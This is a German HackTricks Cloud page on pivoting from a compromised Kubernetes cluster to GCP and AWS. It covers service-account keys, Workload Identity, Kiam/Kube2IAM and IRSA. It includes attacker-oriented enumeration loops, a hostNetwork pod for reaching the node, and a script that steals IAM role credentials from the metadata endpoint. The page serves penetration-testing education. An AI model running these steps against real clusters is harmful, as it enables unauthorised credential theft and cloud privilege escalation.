# Kubernetes Pivoting zu Clouds

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## GCP

Wenn Sie einen k8s-Cluster in GCP ausf√ºhren, m√∂chten Sie wahrscheinlich, dass eine Anwendung, die im Cluster l√§uft, auf GCP zugreifen kann. Es gibt 2 g√§ngige M√∂glichkeiten, dies zu tun:

### GCP-SA-Schl√ºssel als Geheimnis einbinden

Ein √ºblicher Weg, **einer Kubernetes-Anwendung Zugriff auf GCP zu geben**, ist:

* Erstellen eines GCP-Servicekontos
* Binden der gew√ºnschten Berechtigungen daran
* Herunterladen eines JSON-Schl√ºssels des erstellten SA
* Einbinden als Geheimnis innerhalb des Pods
* Setzen der Umgebungsvariable GOOGLE\_APPLICATION\_CREDENTIALS, die auf den Pfad zeigt, an dem sich das JSON befindet.

{% hint style="warning" %}
Daher sollten Sie als **Angreifer**, wenn Sie einen Container innerhalb eines Pods kompromittieren, auf diese **Umgebungsvariable** und **JSON-Dateien** mit GCP-Anmeldeinformationen √ºberpr√ºfen.
{% endhint %}

### Verkn√ºpfung von GSA-JSON mit KSA-Geheimnis

Eine M√∂glichkeit, einem GSA Zugriff auf einen GKE-Cluster zu geben, besteht darin, sie folgenderma√üen zu binden:

* Erstellen Sie ein Kubernetes-Servicekonto im selben Namespace wie Ihr GKE-Cluster mit dem folgenden Befehl:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Erstellen Sie ein Kubernetes Secret, das die Anmeldeinformationen des GCP-Dienstkontos enth√§lt, dem Sie Zugriff auf den GKE-Cluster gew√§hren m√∂chten. Dies k√∂nnen Sie mit dem `gcloud` Befehlszeilentool tun, wie im folgenden Beispiel gezeigt:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Binden Sie das Kubernetes Secret an das Kubernetes-Service-Konto mit dem folgenden Befehl:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
Im **zweiten Schritt** wurden die **Anmeldedaten des GSA als Geheimnis des KSA festgelegt**. Wenn Sie dann dieses Geheimnis **innerhalb** des **GKE-Clusters lesen k√∂nnen**, k√∂nnen Sie **zu diesem GCP-Dienstkonto eskalieren**.
{% endhint %}

### GKE-Workload-Identit√§t

Mit der Workload-Identit√§t k√∂nnen wir ein [Kubernetes-Servicekonto](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) konfigurieren, um als [Google-Dienstkonto](https://cloud.google.com/iam/docs/understanding-service-accounts) zu fungieren. Pods, die mit dem Kubernetes-Servicekonto ausgef√ºhrt werden, authentifizieren sich automatisch als das Google-Dienstkonto beim Zugriff auf Google Cloud APIs.

Die **erste Reihe von Schritten**, um dieses Verhalten zu aktivieren, besteht darin, **Workload-Identit√§t in GCP zu aktivieren** ([**Schritte**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) und das GCP SA zu erstellen, das Sie m√∂chten, dass k8s es verk√∂rpert.

* **Aktivieren Sie die Workload-Identit√§t** auf einem neuen Cluster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Erstellen/Aktualisieren eines neuen Nodepools** (Autopilot-Cluster ben√∂tigen dies nicht)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Erstellen Sie das **GCP-Dienstkonto zum Impersonieren** von K8s mit GCP-Berechtigungen:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Verbinden** Sie sich mit dem **Cluster** und **erstellen** Sie das **Service-Konto**, das verwendet werden soll

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Binden Sie die GSA mit der KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
* F√ºhren Sie ein **Pod** mit dem **KSA** aus und √ºberpr√ºfen Sie den **Zugriff** auf **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
√úberpr√ºfen Sie den folgenden Befehl zur Authentifizierung, falls erforderlich:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
Als Angreifer innerhalb von K8s sollten Sie nach SAs mit der `iam.gke.io/gcp-service-account`-Annotation suchen, da dies darauf hinweist, dass der SA auf etwas in GCP zugreifen kann. Eine andere Option w√§re, zu versuchen, jeden KSA im Cluster zu missbrauchen und zu √ºberpr√ºfen, ob er Zugriff hat.\
Von GCP aus ist es immer interessant, die Bindungen aufzulisten und zu wissen, welchen Zugriff Sie den SAs innerhalb von Kubernetes geben.
{% endhint %}

Dies ist ein Skript, um einfach √ºber alle Pod-Definitionen zu iterieren und nach dieser Annotation zu suchen:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM-Rolle f√ºr Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Ein (veralteter) Weg, IAM-Rollen an Pods zu vergeben, besteht darin, einen [**Kiam**](https://github.com/uswitch/kiam) oder einen [**Kube2IAM**](https://github.com/jtblin/kube2iam) **Server** zu verwenden. Grunds√§tzlich m√ºssen Sie einen **Daemonset** in Ihrem Cluster mit einer **Art privilegierter IAM-Rolle** ausf√ºhren. Dieses Daemonset wird IAM-Rollen den Pods zug√§nglich machen, die sie ben√∂tigen.

Zun√§chst m√ºssen Sie konfigurieren, **auf welche Rollen innerhalb des Namespaces zugegriffen werden kann**, und das geschieht mit einer Annotation im Namespace-Objekt:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Sobald der Namespace mit den IAM-Rollen konfiguriert ist, die die Pods haben k√∂nnen, **k√∂nnen Sie die Rolle, die Sie auf jeder Pod-Definition m√∂chten, angeben, indem Sie etwas √Ñhnliches wie**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
Als Angreifer k√∂nnen Sie, wenn Sie **diese Anmerkungen** in Pods oder Namespaces finden oder einen kiam/kube2iam-Server (wahrscheinlich in kube-system) laufen lassen, **jede Rolle nachahmen**, die bereits **von Pods verwendet wird**, und mehr (wenn Sie Zugriff auf das AWS-Konto haben, die Rollen auflisten).
{% endhint %}

#### Pod mit IAM-Rolle erstellen

{% hint style="info" %}
Die IAM-Rolle, die angegeben werden muss, muss sich im selben AWS-Konto wie die kiam/kube2iam-Rolle befinden und diese Rolle muss darauf zugreifen k√∂nnen.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM-Rolle f√ºr K8s-Service-Konten √ºber OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Dies ist der **empfohlene Weg von AWS**.

1. Zun√§chst m√ºssen Sie [einen OIDC-Anbieter f√ºr den Cluster erstellen](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Erstellen Sie dann eine IAM-Rolle mit den Berechtigungen, die das SK ben√∂tigen wird.
3. Erstellen Sie eine [Vertrauensbeziehung zwischen der IAM-Rolle und dem SK](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) Namen (oder den Namespaces, die dem SK Zugriff auf alle SKs des Namespaces gew√§hren). _Die Vertrauensbeziehung √ºberpr√ºft haupts√§chlich den OIDC-Anbieter-Namen, den Namespace-Namen und den SK-Namen_.
4. Schlie√ülich **erstellen Sie ein SK mit einer Annotation, die den ARN der Rolle angibt**, und die Pods, die mit diesem SK ausgef√ºhrt werden, haben **Zugriff auf das Token der Rolle**. Das **Token** wird **in einer Datei geschrieben** und der Pfad wird in **`AWS_WEB_IDENTITY_TOKEN_FILE`** angegeben (Standard: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`).
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Um **aws mit dem Token** von `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` zu erhalten, f√ºhren Sie aus:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
Als Angreifer k√∂nnen Sie, wenn Sie einen K8s-Cluster aufz√§hlen k√∂nnen, nach **Service-Konten mit dieser Annotation** suchen, um zu **AWS zu eskalieren**. F√ºhren Sie einfach einen **Pod** mit einem der IAM-**privilegierten Service-Konten** aus/erstellen und stehlen Sie das Token.

Dar√ºber hinaus sollten Sie, wenn Sie sich innerhalb eines Pods befinden, nach Umgebungsvariablen wie **AWS\_ROLE\_ARN** und **AWS\_WEB\_IDENTITY\_TOKEN** suchen.
{% endhint %}

{% hint style="danger" %}
Manchmal ist die **Vertrauensrichtlinie einer Rolle** m√∂glicherweise **schlecht konfiguriert** und gibt anstelle des Erteilen des AssumeRole-Zugriffs auf das erwartete Service-Konto diesen Zugriff an **alle Service-Konten**. Wenn Sie also in der Lage sind, eine Annotation auf einem kontrollierten Service-Konto zu schreiben, k√∂nnen Sie auf die Rolle zugreifen.

√úberpr√ºfen Sie die **folgende Seite f√ºr weitere Informationen**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Finden von Pods und SAs mit IAM-Rollen im Cluster

Dies ist ein Skript, um einfach √ºber alle Pods und SA-Definitionen zu **iterieren**, um nach dieser **Annotation** zu suchen:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Knoten-IAM-Rolle

Der vorherige Abschnitt handelte davon, wie man IAM-Rollen mit Pods stiehlt, aber beachten Sie, dass ein **Knoten des** K8s-Clusters ein **Instanz innerhalb der Cloud** sein wird. Dies bedeutet, dass es h√∂chstwahrscheinlich eine neue IAM-Rolle geben wird, die Sie stehlen k√∂nnen (_beachten Sie, dass in der Regel alle Knoten eines K8s-Clusters dieselbe IAM-Rolle haben, daher lohnt es sich m√∂glicherweise nicht, jeden Knoten zu √ºberpr√ºfen_).

Es gibt jedoch eine wichtige Voraussetzung, um auf den Metadaten-Endpunkt vom Knoten aus zuzugreifen: Sie m√ºssen auf dem Knoten sein (SSH-Sitzung?) oder zumindest das gleiche Netzwerk haben:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### IAM-Rollen-Token stehlen

Zuvor haben wir besprochen, wie man **IAM-Rollen an Pods anh√§ngt** oder sogar wie man **zum Node entkommt, um die IAM-Rolle zu stehlen**, die der Instanz angeh√§ngt ist.

Sie k√∂nnen das folgende Skript verwenden, um Ihre neu erarbeiteten **IAM-Rollen-Anmeldeinformationen zu stehlen**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Referenzen

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
